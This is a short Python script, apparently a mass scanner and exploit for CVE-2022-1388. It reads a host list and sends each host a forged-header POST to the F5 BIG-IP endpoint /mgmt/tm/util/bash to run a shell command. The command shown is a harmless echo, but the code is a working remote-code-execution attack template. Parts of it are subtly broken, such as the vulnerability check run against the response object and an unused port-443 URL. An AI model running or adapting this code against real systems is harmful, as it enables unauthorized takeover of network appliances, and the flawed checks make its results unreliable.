#!/usr/bin/python3

#Created by EvilLizard666

import requests
import sys

hosts_file_to_scan = open(sys.argv[1], 'r')
command_to_exec = "echo VULN"
requests.packages.urllib3.disable_warnings() 

for i in hosts_file_to_scan.readlines():
    i = i.strip()
    url_8443 = "https://"+i+":8443/mgmt/tm/util/bash"
    url_443 = "https://"+i+":443/mgmt/tm/util/bash" 
    try:
    	resp=requests.get(url_8443, verify=False, timeout=5)
    	print(i +" [+] API Exposed\n")
    	print("[+] Tesing For CVE-2022-1388 RCE")
    	try:
    	    resp_post=requests.post(url_8443, headers={"X-F5-Auth-Token":"a","Authorization":"Basic YWRtaW46","Connection":"keep-alive, X-F5-Auth-Token"},verify=False, timeout=5, json={"command":"run","utilCmdArgs":"-c " + command_to_exec})
    	    if "VULN" in resp_post:
    	    	print(i+"[+] VULNERABLE to rce")
    	    	print(resp_post.text)
    	    else:
    	    	print("[-] Not Vulnerable to rce")
    	except:
            print("FAIL")
    	

    except:
        print(i+" [-] Port 8443 Failed")    	
